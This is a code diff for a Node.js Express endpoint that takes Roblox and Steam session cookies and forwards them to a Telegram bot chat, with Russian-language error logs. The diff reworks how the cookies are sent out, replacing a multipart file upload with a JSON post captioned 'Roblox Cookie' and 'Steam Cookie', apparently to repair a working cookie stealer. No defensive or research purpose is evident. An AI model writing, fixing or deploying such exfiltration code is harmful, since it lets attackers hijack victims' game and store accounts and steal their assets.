@@ -26,32 +26,27 @@ app.post('/send', async (req, res) => {
             text: msg
         });
 
-        // Файл через sendDocument с multipart/form-data (правильно)
         if (robloxCookie) {
             try {
-                const { default: FormData } = await import('form-data');
-                const fd = new FormData();
-                fd.append('chat_id', CHAT_ID);
-                fd.append('document', Buffer.from(robloxCookie), 'roblox.txt');
-                await axios.post(API + "/sendDocument", fd, {
-                    headers: fd.getHeaders()
+                await axios.post(API + "/sendDocument", {
+                    chat_id: CHAT_ID,
+                    document: robloxCookie,
+                    caption: "Roblox Cookie"
                 });
             } catch (e) {
-                console.log('Ошибка роблокс:', e.message);
+                console.log('Ошибка роблокс:', e.response?.data || e.message);
             }
         }
 
         if (steamCookie) {
             try {
-                const { default: FormData } = await import('form-data');
-                const fd = new FormData();
-                fd.append('chat_id', CHAT_ID);
-                fd.append('document', Buffer.from(steamCookie), 'steam.txt');
-                await axios.post(API + "/sendDocument", fd, {
-                    headers: fd.getHeaders()
+                await axios.post(API + "/sendDocument", {
+                    chat_id: CHAT_ID,
+                    document: steamCookie,
+                    caption: "Steam Cookie"
                 });
             } catch (e) {
-                console.log('Ошибка стим:', e.message);
+                console.log('Ошибка стим:', e.response?.data || e.message);
             }
         }
 
